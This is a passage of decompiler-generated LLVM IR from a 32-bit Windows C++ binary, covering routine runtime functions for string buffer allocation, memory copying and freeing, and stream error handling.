  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !3062
  br label %dec_label_pc_10005f7d, !insn.addr !3062

dec_label_pc_10005f7d:                            ; preds = %dec_label_pc_10005f40, %dec_label_pc_10005f78
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %9 = add i32 %0, 20, !insn.addr !3063
  %10 = inttoptr i32 %9 to i32*, !insn.addr !3063
  %11 = load i32, i32* %10, align 4, !insn.addr !3063
  %12 = or i32 %eax.0.reload, 15, !insn.addr !3064
  %13 = icmp ult i32 %12, -2, !insn.addr !3065
  store i32 %eax.0.reload, i32* %edi.0.reg2mem, !insn.addr !3066
  br i1 %13, label %dec_label_pc_10005f91, label %dec_label_pc_10005fb5, !insn.addr !3066

dec_label_pc_10005f91:                            ; preds = %dec_label_pc_10005f7d
  %14 = udiv i32 %11, 2, !insn.addr !3067
  %15 = udiv i32 %12, 3, !insn.addr !3068
  %16 = icmp ugt i32 %14, %15
  store i32 %12, i32* %edi.0.reg2mem, !insn.addr !3069
  br i1 %16, label %dec_label_pc_10005fa2, label %dec_label_pc_10005fb5, !insn.addr !3069

dec_label_pc_10005fa2:                            ; preds = %dec_label_pc_10005f91
  %17 = add i32 %14, %11, !insn.addr !3070
  %18 = sub nuw i32 -2, %14, !insn.addr !3071
  %19 = icmp ugt i32 %11, %18
  %spec.store.select = select i1 %19, i32 -2, i32 %17
  store i32 %spec.store.select, i32* %edi.0.reg2mem
  br label %dec_label_pc_10005fb5

dec_label_pc_10005fb5:                            ; preds = %dec_label_pc_10005f7d, %dec_label_pc_10005fa2, %dec_label_pc_10005f91
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %20 = add i32 %edi.0.reload, 1, !insn.addr !3072
  %21 = icmp eq i32 %20, 0, !insn.addr !3073
  %22 = icmp eq i1 %21, false, !insn.addr !3074
  br i1 %22, label %dec_label_pc_10005fc7, label %dec_label_pc_10005fc3, !insn.addr !3074

dec_label_pc_10005fc3:                            ; preds = %dec_label_pc_10005fb5
  %23 = call i32 @function_1000601d(i32 %11, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3075
  ret i32 %23, !insn.addr !3075

dec_label_pc_10005fc7:                            ; preds = %dec_label_pc_10005fb5
  %24 = icmp ult i32 %20, 4096, !insn.addr !3076
  br i1 %24, label %dec_label_pc_10005fee, label %dec_label_pc_10005fce, !insn.addr !3077

dec_label_pc_10005fce:                            ; preds = %dec_label_pc_10005fc7
  %25 = icmp ugt i32 %20, -36, !insn.addr !3078
  br i1 %25, label %dec_label_pc_10005fd5, label %dec_label_pc_10005fda, !insn.addr !3079

dec_label_pc_10005fd5:                            ; preds = %dec_label_pc_10005fce
  %26 = call i32 @"?_Xbad_alloc@std@@YAXXZ"(), !insn.addr !3080
  br label %dec_label_pc_10005fda, !insn.addr !3080

dec_label_pc_10005fda:                            ; preds = %dec_label_pc_10005fce, %dec_label_pc_10005fd5
  %27 = add i32 %edi.0.reload, 36, !insn.addr !3081
  %28 = call i32 @"??2@YAPAXI@Z"(i32 %27), !insn.addr !3082
  %29 = add i32 %28, 35, !insn.addr !3083
  %30 = and i32 %29, -32, !insn.addr !3084
  %31 = add i32 %30, -4, !insn.addr !3085
  %32 = inttoptr i32 %31 to i32*, !insn.addr !3085
  store i32 %28, i32* %32, align 4, !insn.addr !3085
  %33 = call i32 @function_1000601d(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3086
  ret i32 %33, !insn.addr !3086

dec_label_pc_10005fee:                            ; preds = %dec_label_pc_10005fc7
  %34 = call i32 @"??2@YAPAXI@Z"(i32 %20), !insn.addr !3087
  %35 = call i32 @function_1000601d(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3088
  ret i32 %35, !insn.addr !3088
}

define i32 @function_10005ffb() local_unnamed_addr {
dec_label_pc_10005ffb:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !3089
  %2 = inttoptr i32 %1 to i32*, !insn.addr !3089
  %3 = load i32, i32* %2, align 4, !insn.addr !3089
  %4 = add i32 %3, 1, !insn.addr !3090
  %5 = call i32 @function_10006380(i32 %4), !insn.addr !3091
  %6 = add i32 %0, -28, !insn.addr !3092
  %7 = inttoptr i32 %6 to i32*, !insn.addr !3092
  store i32 %5, i32* %7, align 4, !insn.addr !3092
  ret i32 268460052, !insn.addr !3093
}

define i32 @function_1000601d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000601d:
  %storemerge.reg2mem = alloca i32, !insn.addr !3094
  %ecx.0.reg2mem = alloca i32, !insn.addr !3094
  %eax.1.reg2mem = alloca i32, !insn.addr !3094
  %eax.0.reg2mem = alloca i32, !insn.addr !3094
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 20, !insn.addr !3095
  %3 = inttoptr i32 %2 to i32*, !insn.addr !3095
  %4 = load i32, i32* %3, align 4, !insn.addr !3095
  %5 = icmp ult i32 %4, 16, !insn.addr !3095
  %6 = call i32 @_memcpy.12()
  store i32 %6, i32* %storemerge.reg2mem, !insn.addr !3096
  br i1 %5, label %dec_label_pc_10006083, label %dec_label_pc_10006028, !insn.addr !3096

dec_label_pc_10006028:                            ; preds = %dec_label_pc_1000601d
  %7 = add i32 %1, -24, !insn.addr !3097
  %8 = inttoptr i32 %7 to i32*, !insn.addr !3097
  %9 = load i32, i32* %8, align 4, !insn.addr !3097
  %10 = add i32 %9, 1, !insn.addr !3098
  %11 = icmp ult i32 %10, 4096, !insn.addr !3099
  br i1 %11, label %dec_label_pc_1000606e, label %dec_label_pc_10006040, !insn.addr !3100

dec_label_pc_10006040:                            ; preds = %dec_label_pc_10006028
  %12 = and i32 %0, 31
  %13 = icmp eq i32 %12, 0, !insn.addr !3101
  br i1 %13, label %dec_label_pc_1000604a, label %dec_label_pc_10006045, !insn.addr !3102

dec_label_pc_10006045:                            ; preds = %dec_label_pc_10006040
  %14 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3103
  br label %dec_label_pc_1000604a, !insn.addr !3103

dec_label_pc_1000604a:                            ; preds = %dec_label_pc_10006045, %dec_label_pc_10006040
  %15 = add i32 %0, -4, !insn.addr !3104
  %16 = inttoptr i32 %15 to i32*, !insn.addr !3104
  %17 = load i32, i32* %16, align 4, !insn.addr !3104
  %18 = icmp ult i32 %17, %0, !insn.addr !3105
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !3106
  br i1 %18, label %dec_label_pc_10006056, label %dec_label_pc_10006051, !insn.addr !3106

dec_label_pc_10006051:                            ; preds = %dec_label_pc_1000604a
  %19 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3107
  store i32 %19, i32* %eax.0.reg2mem, !insn.addr !3107
  br label %dec_label_pc_10006056, !insn.addr !3107

dec_label_pc_10006056:                            ; preds = %dec_label_pc_10006051, %dec_label_pc_1000604a
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %20 = sub i32 %0, %eax.0.reload, !insn.addr !3108
  %21 = icmp ult i32 %20, 4, !insn.addr !3109
  %22 = icmp eq i1 %21, false, !insn.addr !3110
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !3110
  br i1 %22, label %dec_label_pc_10006062, label %dec_label_pc_1000605d, !insn.addr !3110

dec_label_pc_1000605d:                            ; preds = %dec_label_pc_10006056
  %23 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3111
  store i32 %23, i32* %eax.1.reg2mem, !insn.addr !3111
  br label %dec_label_pc_10006062, !insn.addr !3111

dec_label_pc_10006062:                            ; preds = %dec_label_pc_1000605d, %dec_label_pc_10006056
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %24 = icmp ult i32 %20, 36
  store i32 %eax.1.reload, i32* %ecx.0.reg2mem, !insn.addr !3112
  br i1 %24, label %dec_label_pc_1000606e, label %dec_label_pc_10006067, !insn.addr !3112

dec_label_pc_10006067:                            ; preds = %dec_label_pc_10006062
  %25 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !3113
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !3113
  br label %dec_label_pc_1000606e, !insn.addr !3113

dec_label_pc_1000606e:                            ; preds = %dec_label_pc_10006062, %dec_label_pc_10006067, %dec_label_pc_10006028
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %26 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !3114
  call void @_free(i32* %26), !insn.addr !3114
  store i32 ptrtoint (i32* @1 to i32), i32* %storemerge.reg2mem, !insn.addr !3115
  br label %dec_label_pc_10006083, !insn.addr !3115

dec_label_pc_10006083:                            ; preds = %dec_label_pc_1000601d, %dec_label_pc_1000606e
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %27 = inttoptr i32 %0 to i32*, !insn.addr !3116
  %28 = add i32 %1, -12, !insn.addr !3117
  %29 = inttoptr i32 %28 to i32*, !insn.addr !3117
  %30 = load i32, i32* %29, align 4, !insn.addr !3117
  call void @__writefsdword(i32 0, i32 %30), !insn.addr !3118
  ret i32 %storemerge.reload, !insn.addr !3119
}

define i32 @function_100060a0(i32 %arg1, i32 %arg2, i32 %arg3, i8 %arg4) local_unnamed_addr {
dec_label_pc_100060a0:
  %ecx.2.reg2mem = alloca i32, !insn.addr !3120
  %ebx.0.reg2mem = alloca i32, !insn.addr !3120
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !3120
  %ecx.0.reg2mem = alloca i32, !insn.addr !3120
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %5 = add i32 %arg1, 16, !insn.addr !3121
  %6 = inttoptr i32 %5 to i32*, !insn.addr !3121
  %7 = load i32, i32* %6, align 4, !insn.addr !3121
  %8 = icmp ult i32 %7, %arg2, !insn.addr !3122
  br i1 %8, label %dec_label_pc_1000618b, label %dec_label_pc_100060b9, !insn.addr !3123

dec_label_pc_100060b9:                            ; preds = %dec_label_pc_100060a0
  %9 = sub i32 %7, %arg2, !insn.addr !3124
  %10 = icmp ult i32 %9, %arg3, !insn.addr !3125
  %11 = select i1 %10, i32 %9, i32 %arg3, !insn.addr !3126
  %12 = icmp eq i32 %3, %arg1, !insn.addr !3127
  %13 = icmp eq i1 %12, false, !insn.addr !3128
  br i1 %13, label %dec_label_pc_1000610e, label %dec_label_pc_100060c7, !insn.addr !3128

dec_label_pc_100060c7:                            ; preds = %dec_label_pc_100060b9
  %14 = add i32 %11, %arg2, !insn.addr !3129
  %15 = add i32 %3, 16, !insn.addr !3130
  %16 = inttoptr i32 %15 to i32*, !insn.addr !3130
  %17 = load i32, i32* %16, align 4, !insn.addr !3130
  %18 = icmp ult i32 %17, %14, !insn.addr !3130
  store i32 %14, i32* %ecx.2.reg2mem, !insn.addr !3131
  br i1 %18, label %dec_label_pc_10006190, label %dec_label_pc_100060d3, !insn.addr !3131

dec_label_pc_100060d3:                            ; preds = %dec_label_pc_100060c7
  store i32 %14, i32* %16, align 4, !insn.addr !3132
  %19 = add i32 %3, 20, !insn.addr !3133
  %20 = inttoptr i32 %19 to i32*, !insn.addr !3133
  %21 = load i32, i32* %20, align 4, !insn.addr !3133
  %22 = icmp ult i32 %21, 16, !insn.addr !3133
  store i32 %arg2, i32* %stack_var_-20, align 4
  br i1 %22, label %dec_label_pc_100060f5, label %dec_label_pc_100060dc, !insn.addr !3134

dec_label_pc_100060dc:                            ; preds = %dec_label_pc_100060d3
  %23 = mul i32 %14, 2, !insn.addr !3135
  %24 = inttoptr i32 %23 to i8*, !insn.addr !3135
  store i8 0, i8* %24, align 2, !insn.addr !3135
  %25 = load i32, i32* %stack_var_-20, align 4, !insn.addr !3136
  %26 = call i32 @function_100063e0(i32 0, i32 %25), !insn.addr !3136
  ret i32 %3, !insn.addr !3137

dec_label_pc_100060f5:                            ; preds = %dec_label_pc_100060d3
  %27 = add i32 %14, %3, !insn.addr !3138
  %28 = inttoptr i32 %27 to i8*, !insn.addr !3138
  store i8 0, i8* %28, align 1, !insn.addr !3138
  %29 = load i32, i32* %stack_var_-20, align 4, !insn.addr !3139
  %30 = call i32 @function_100063e0(i32 0, i32 %29), !insn.addr !3139
  ret i32 %3, !insn.addr !3140

dec_label_pc_1000610e:                            ; preds = %dec_label_pc_100060b9
  %31 = icmp eq i32 %11, 0, !insn.addr !3141
  %32 = icmp eq i1 %31, false, !insn.addr !3142
  %33 = add i32 %3, 20
  %34 = inttoptr i32 %33 to i32*
  %35 = load i32, i32* %34, align 4
  br i1 %32, label %dec_label_pc_10006135, label %dec_label_pc_10006112, !insn.addr !3142

dec_label_pc_10006112:                            ; preds = %dec_label_pc_1000610e
  %36 = icmp ult i32 %35, 16, !insn.addr !3143
  %37 = add i32 %3, 16, !insn.addr !3144
  %38 = inttoptr i32 %37 to i32*, !insn.addr !3144
  store i32 %11, i32* %38, align 4, !insn.addr !3144
  br i1 %36, label %dec_label_pc_10006129, label %dec_label_pc_1000611b, !insn.addr !3145

dec_label_pc_1000611b:                            ; preds = %dec_label_pc_10006112
  %39 = inttoptr i32 %9 to i8*, !insn.addr !3146
  store i8 0, i8* %39, align 1, !insn.addr !3146
  ret i32 %3, !insn.addr !3147

dec_label_pc_10006129:                            ; preds = %dec_label_pc_10006112
  %40 = inttoptr i32 %3 to i8*, !insn.addr !3148
  store i8 0, i8* %40, align 1, !insn.addr !3148
  ret i32 %3, !insn.addr !3149

dec_label_pc_10006135:                            ; preds = %dec_label_pc_1000610e
  %41 = icmp ult i32 %35, %11, !insn.addr !3150
  %42 = icmp eq i1 %41, false, !insn.addr !3151
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !3151
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !3151
  br i1 %42, label %dec_label_pc_10006145, label %dec_label_pc_1000613a, !insn.addr !3151

dec_label_pc_1000613a:                            ; preds = %dec_label_pc_10006135
  store i32 %11, i32* %stack_var_-20, align 4, !insn.addr !3152
  %43 = call i32 @function_10005f40(i32 %11, i32 %0, i32 %1, i32 %2), !insn.addr !3153
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !3154
  br label %dec_label_pc_10006145, !insn.addr !3154

dec_label_pc_10006145:                            ; preds = %dec_label_pc_1000613a, %dec_label_pc_10006135
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %44 = add i32 %arg1, 20, !insn.addr !3155
  %45 = inttoptr i32 %44 to i32*, !insn.addr !3155
  %46 = load i32, i32* %45, align 4, !insn.addr !3155
  %47 = icmp ult i32 %46, 16, !insn.addr !3155
  store i32 %arg1, i32* %ebx.0.reg2mem, !insn.addr !3156
  br i1 %47, label %dec_label_pc_1000614d, label %dec_label_pc_1000614b, !insn.addr !3156

dec_label_pc_1000614b:                            ; preds = %dec_label_pc_10006145
  %48 = inttoptr i32 %arg1 to i32*, !insn.addr !3157
  %49 = load i32, i32* %48, align 4, !insn.addr !3157
  store i32 %49, i32* %ebx.0.reg2mem, !insn.addr !3157
  br label %dec_label_pc_1000614d, !insn.addr !3157

dec_label_pc_1000614d:                            ; preds = %dec_label_pc_1000614b, %dec_label_pc_10006145
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %50 = load i32, i32* %34, align 4, !insn.addr !3158
  %51 = icmp ult i32 %50, 16, !insn.addr !3158
  %spec.select = select i1 %51, i32 %3, i32 %ecx.0.reload
  %52 = add i32 %esp.0, -4, !insn.addr !3159
  %53 = inttoptr i32 %52 to i32*, !insn.addr !3159
  store i32 %11, i32* %53, align 4, !insn.addr !3159
  %54 = add i32 %ebx.0.reload, %arg2, !insn.addr !3160
  %55 = add i32 %esp.0, -8, !insn.addr !3161
  %56 = inttoptr i32 %55 to i32*, !insn.addr !3161
  store i32 %54, i32* %56, align 4, !insn.addr !3161
  %57 = add i32 %esp.0, -12, !insn.addr !3162
  %58 = inttoptr i32 %57 to i32*, !insn.addr !3162
  store i32 %spec.select, i32* %58, align 4, !insn.addr !3162
  %59 = call i32 @_memcpy.12(), !insn.addr !3163
  %60 = add i32 %3, 16, !insn.addr !3164
  %61 = inttoptr i32 %60 to i32*, !insn.addr !3164
  store i32 %11, i32* %61, align 4, !insn.addr !3164
  %62 = load i32, i32* %34, align 4, !insn.addr !3165
  %63 = icmp ult i32 %62, 16, !insn.addr !3165
  br i1 %63, label %dec_label_pc_1000617e, label %dec_label_pc_1000616f, !insn.addr !3166

dec_label_pc_1000616f:                            ; preds = %dec_label_pc_1000614d
  %64 = add i32 %spec.select, %11, !insn.addr !3167
  %65 = inttoptr i32 %64 to i8*, !insn.addr !3167
  store i8 0, i8* %65, align 1, !insn.addr !3167
  ret i32 %3, !insn.addr !3168

dec_label_pc_1000617e:                            ; preds = %dec_label_pc_1000614d
  %66 = add i32 %11, %3, !insn.addr !3169
  %67 = inttoptr i32 %66 to i8*, !insn.addr !3169
  store i8 0, i8* %67, align 1, !insn.addr !3169
  ret i32 %3, !insn.addr !3170

dec_label_pc_1000618b:                            ; preds = %dec_label_pc_100060a0
  %68 = call i32 @function_100063d0(), !insn.addr !3171
  store i32 %7, i32* %ecx.2.reg2mem, !insn.addr !3171
  br label %dec_label_pc_10006190, !insn.addr !3171

dec_label_pc_10006190:                            ; preds = %dec_label_pc_1000618b, %dec_label_pc_100060c7
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %69 = call i32 @function_100063d0(), !insn.addr !3172
  %70 = call i32 @__asm_int3(), !insn.addr !3173
  %71 = call i32 @__asm_int3(), !insn.addr !3174
  %72 = call i32 @__asm_int3(), !insn.addr !3175
  %73 = call i32 @__asm_int3(), !insn.addr !3176
  %74 = call i32 @__asm_int3(), !insn.addr !3177
  %75 = call i32 @__asm_int3(), !insn.addr !3178
  %76 = call i32 @__asm_int3(), !insn.addr !3179
  %77 = call i32 @__asm_int3(), !insn.addr !3180
  %78 = call i32 @__asm_int3(), !insn.addr !3181
  %79 = call i32 @__asm_int3(), !insn.addr !3182
  %80 = call i32 @__asm_int3(), !insn.addr !3183
  %81 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !3184
  store i32 %81, i32* %stack_var_-20, align 4, !insn.addr !3184
  %82 = call i32 @__readfsdword(i32 0), !insn.addr !3185
  store i32 %82, i32* %stack_var_-32, align 4, !insn.addr !3186
  %83 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !3187
  call void @__writefsdword(i32 0, i32 %83), !insn.addr !3188
  %84 = inttoptr i32 %ecx.2.reload to i32*, !insn.addr !3189
  %85 = load i32, i32* %84, align 4, !insn.addr !3189
  %86 = add i32 %85, 4, !insn.addr !3190
  %87 = inttoptr i32 %86 to i32*, !insn.addr !3190
  %88 = load i32, i32* %87, align 4, !insn.addr !3190
  %89 = add i32 %ecx.2.reload, 56
  %90 = add i32 %88, %89, !insn.addr !3191
  %91 = inttoptr i32 %90 to i32*, !insn.addr !3191
  %92 = load i32, i32* %91, align 4, !insn.addr !3191
  %93 = icmp eq i32 %92, 0, !insn.addr !3191
  br i1 %93, label %dec_label_pc_1000624e, label %dec_label_pc_100061d4, !insn.addr !3192

dec_label_pc_100061d4:                            ; preds = %dec_label_pc_10006190
  %94 = call i32 @function_100046f0(i32 %ecx.2.reload), !insn.addr !3193
  %95 = icmp eq i8 %4, 0, !insn.addr !3194
  br i1 %95, label %dec_label_pc_1000621d, label %dec_label_pc_100061ea, !insn.addr !3195

dec_label_pc_100061ea:                            ; preds = %dec_label_pc_100061d4
  %96 = load i32, i32* %84, align 4, !insn.addr !3196
  %97 = add i32 %96, 4, !insn.addr !3197
  %98 = inttoptr i32 %97 to i32*, !insn.addr !3197
  %99 = load i32, i32* %98, align 4, !insn.addr !3197
  %100 = add i32 %99, %89, !insn.addr !3198
  %101 = inttoptr i32 %100 to i32*, !insn.addr !3198
  %102 = load i32, i32* %101, align 4, !insn.addr !3198
  %103 = inttoptr i32 %102 to i32*, !insn.addr !3199
  %104 = load i32, i32* %103, align 4, !insn.addr !3199
  %105 = icmp eq i32 %104, -1, !insn.addr !3200
  %106 = icmp eq i1 %105, false, !insn.addr !3201
  br i1 %106, label %dec_label_pc_1000621d, label %dec_label_pc_100061fd, !insn.addr !3201

dec_label_pc_100061fd:                            ; preds = %dec_label_pc_100061ea
  %107 = add i32 %99, %ecx.2.reload, !insn.addr !3202
  %108 = add i32 %107, 12, !insn.addr !3203
  %109 = inttoptr i32 %108 to i32*, !insn.addr !3203
  %110 = load i32, i32* %109, align 4, !insn.addr !3203
  %111 = or i32 %110, 4, !insn.addr !3204
  %112 = inttoptr i32 %107 to i32*, !insn.addr !3205
  call void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %112, i32 %111, i1 false), !insn.addr !3205
  br label %dec_label_pc_1000621d, !insn.addr !3205

dec_label_pc_1000621d:                            ; preds = %dec_label_pc_100061fd, %dec_label_pc_100061ea, %dec_label_pc_100061d4
  %113 = call i32 @function_1000e737(), !insn.addr !3206
  %114 = trunc i32 %113 to i8, !insn.addr !3207
  %115 = icmp eq i8 %114, 0, !insn.addr !3207
  %116 = icmp eq i1 %115, false, !insn.addr !3208
  br i1 %116, label %dec_label_pc_1000624e, label %dec_label_pc_1000622d, !insn.addr !3208

dec_label_pc_1000622d:                            ; preds = %dec_label_pc_1000621d
  %117 = call i32 @function_10006260(), !insn.addr !3209
  br label %dec_label_pc_1000624e, !insn.addr !3209

dec_label_pc_1000624e:                            ; preds = %dec_label_pc_1000621d, %dec_label_pc_1000622d, %dec_label_pc_10006190
  %118 = load i32, i32* %stack_var_-32, align 4, !insn.addr !3210
  call void @__writefsdword(i32 0, i32 %118), !insn.addr !3211
  ret i32 %ecx.2.reload, !insn.addr !3212
}

define i32 @function_10006260() local_unnamed_addr {
dec_label_pc_10006260:
  %eax.0.reg2mem = alloca i32, !insn.addr !3213
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !3214
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !3215
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3216
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !3217
  %3 = add i32 %0, 4, !insn.addr !3218
  %4 = inttoptr i32 %3 to i32*, !insn.addr !3218
  %5 = load i32, i32* %4, align 4, !insn.addr !3218
  %6 = add i32 %5, %0
  %7 = add i32 %6, 12, !insn.addr !3219
  %8 = inttoptr i32 %7 to i32*, !insn.addr !3219
  %9 = load i32, i32* %8, align 4, !insn.addr !3219
  %10 = icmp eq i32 %9, 0, !insn.addr !3219
  %11 = icmp eq i1 %10, false, !insn.addr !3220
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !3220
  br i1 %11, label %dec_label_pc_100062d3, label %dec_label_pc_1000629e, !insn.addr !3220

dec_label_pc_1000629e:                            ; preds = %dec_label_pc_10006260
  %12 = add i32 %6, 20, !insn.addr !3221
  %13 = inttoptr i32 %12 to i8*, !insn.addr !3221
  %14 = load i8, i8* %13, align 1, !insn.addr !3221
  %15 = and i8 %14, 2, !insn.addr !3221
  %16 = icmp eq i8 %15, 0, !insn.addr !3221
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !3222
  br i1 %16, label %dec_label_pc_100062d3, label %dec_label_pc_100062a5, !insn.addr !3222

dec_label_pc_100062a5:                            ; preds = %dec_label_pc_1000629e
  %17 = add i32 %6, 56, !insn.addr !3223
  %18 = inttoptr i32 %17 to i32*, !insn.addr !3223
  %19 = load i32, i32* %18, align 4, !insn.addr !3223
  %20 = inttoptr i32 %19 to i32*, !insn.addr !3224
  %21 = load i32, i32* %20, align 4, !insn.addr !3224
  %22 = icmp eq i32 %21, -1, !insn.addr !3225
  %23 = icmp eq i1 %22, false, !insn.addr !3226
  store i32 %21, i32* %eax.0.reg2mem, !insn.addr !3226
  br i1 %23, label %dec_label_pc_100062d3, label %dec_label_pc_100062b3, !insn.addr !3226

dec_label_pc_100062b3:                            ; preds = %dec_label_pc_100062a5
  %24 = add i32 %19, 4, !insn.addr !3227
  %25 = inttoptr i32 %24 to i32*, !insn.addr !3227
  %26 = load i32, i32* %25, align 4, !insn.addr !3227
  %27 = add i32 %26, %0, !insn.addr !3228
  %28 = add i32 %27, 12, !insn.addr !3229
  %29 = inttoptr i32 %28 to i32*, !insn.addr !3229
  %30 = load i32, i32* %29, align 4, !insn.addr !3229
  %31 = or i32 %30, 4, !insn.addr !3230
  %32 = inttoptr i32 %27 to i32*, !insn.addr !3231
  call void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %32, i32 %31, i1 false), !insn.addr !3231
  store i32 ptrtoint (i32* @1 to i32), i32* %eax.0.reg2mem, !insn.addr !3231
  br label %dec_label_pc_100062d3, !insn.addr !3231

dec_label_pc_100062d3:                            ; preds = %dec_label_pc_100062b3, %dec_label_pc_100062a5, %dec_label_pc_1000629e, %dec_label_pc_10006260
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %33 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3232
  call void @__writefsdword(i32 0, i32 %33), !insn.addr !3233
  ret i32 %eax.0.reload, !insn.addr !3234
}

define i32 @function_100062e5() local_unnamed_addr {
dec_label_pc_100062e5:
  ret i32 268460755, !insn.addr !3235
}

define i32 @function_100062f0(i8 %arg1) {
dec_label_pc_100062f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !3236
  %2 = inttoptr i32 %1 to i32*, !insn.addr !3236
  %3 = load i32, i32* %2, align 4, !insn.addr !3236
  %4 = inttoptr i32 %0 to i32*, !insn.addr !3237
  store i32 ptrtoint (%vtable_1002dfec_type* @global_var_1002dfec to i32), i32* %4, align 4, !insn.addr !3237
  %5 = inttoptr i32 %3 to i32*, !insn.addr !3238
  call void @_free(i32* %5), !insn.addr !3238
  %6 = add i32 %0, 16, !insn.addr !3239
  %7 = inttoptr i32 %6 to i32*, !insn.addr !3239
  %8 = load i32, i32* %7, align 4, !insn.addr !3239
  %9 = inttoptr i32 %8 to i32*, !insn.addr !3240
  call void @_free(i32* %9), !insn.addr !3240
  %10 = add i32 %0, 20, !insn.addr !3241
  %11 = inttoptr i32 %10 to i32*, !insn.addr !3241
  %12 = load i32, i32* %11, align 4, !insn.addr !3241
  %13 = inttoptr i32 %12 to i32*, !insn.addr !3242
  call void @_free(i32* %13), !insn.addr !3242
  store i32 ptrtoint (i32* @global_var_1002d2f8 to i32), i32* %4, align 4, !insn.addr !3243
  %14 = and i8 %arg1, 1, !insn.addr !3244
  %15 = icmp eq i8 %14, 0, !insn.addr !3244
  br i1 %15, label %dec_label_pc_1000632e, label %dec_label_pc_10006323, !insn.addr !3245

dec_label_pc_10006323:                            ; preds = %dec_label_pc_100062f0
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 24), !insn.addr !3246
  br label %dec_label_pc_1000632e, !insn.addr !3247

dec_label_pc_1000632e:                            ; preds = %dec_label_pc_10006323, %dec_label_pc_100062f0
  ret i32 %0, !insn.addr !3248
}

declare i32 @"?_Tidy@?$numpunct@D@std@@AAEXXZ"() local_unnamed_addr

define i32 @function_10006360(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006360:
  ret i32 %arg1, !insn.addr !3249
}

define i32 @function_10006380(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006380:
  %0 = icmp eq i32 %arg1, 0, !insn.addr !3250
  %1 = icmp eq i1 %0, false, !insn.addr !3251
  br i1 %1, label %dec_label_pc_10006392, label %dec_label_pc_1000638a, !insn.addr !3251

dec_label_pc_1000638a:                            ; preds = %dec_label_pc_10006380
  ret i32 0, !insn.addr !3252

dec_label_pc_10006392:                            ; preds = %dec_label_pc_10006380
  %2 = icmp ult i32 %arg1, 4096, !insn.addr !3253
  br i1 %2, label %dec_label_pc_100063b8, label %dec_label_pc_10006399, !insn.addr !3254

dec_label_pc_10006399:                            ; preds = %dec_label_pc_10006392
  %3 = icmp ugt i32 %arg1, -36, !insn.addr !3255
  br i1 %3, label %dec_label_pc_100063c7, label %dec_label_pc_100063a0, !insn.addr !3256

dec_label_pc_100063a0:                            ; preds = %dec_label_pc_10006399
  %4 = add i32 %arg1, 35, !insn.addr !3257
  %5 = call i32 @"??2@YAPAXI@Z"(i32 %4), !insn.addr !3258
  %6 = add i32 %5, 35, !insn.addr !3259
  %7 = and i32 %6, -32, !insn.addr !3260
  %8 = add i32 %7, -4, !insn.addr !3261
  %9 = inttoptr i32 %8 to i32*, !insn.addr !3261
  store i32 %5, i32* %9, align 4, !insn.addr !3261
  ret i32 %7, !insn.addr !3262

dec_label_pc_100063b8:                            ; preds = %dec_label_pc_10006392
  %10 = call i32 @"??2@YAPAXI@Z"(i32 %arg1), !insn.addr !3263
  ret i32 %10, !insn.addr !3264

dec_label_pc_100063c7:                            ; preds = %dec_label_pc_10006399
